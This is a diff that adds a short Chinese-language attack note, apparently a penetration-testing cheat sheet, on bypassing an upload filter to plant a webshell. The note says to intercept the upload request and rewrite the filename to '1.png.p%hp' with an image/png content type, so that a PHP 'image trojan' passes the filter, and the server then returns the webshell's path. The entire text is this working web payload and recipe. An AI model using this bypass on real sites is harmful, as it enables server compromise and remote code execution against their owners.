@@ -1,0 +1,9 @@
+需求:有上传权限，图片马
+
+选择文件 上传   抓包
+
+重试请求，修改为  Content-Disposition: form-data; name="upload"; filename="1.png.p%hp"
+                 Content-Type: image/png
+                 
+                 
+然后会返回一句话路径
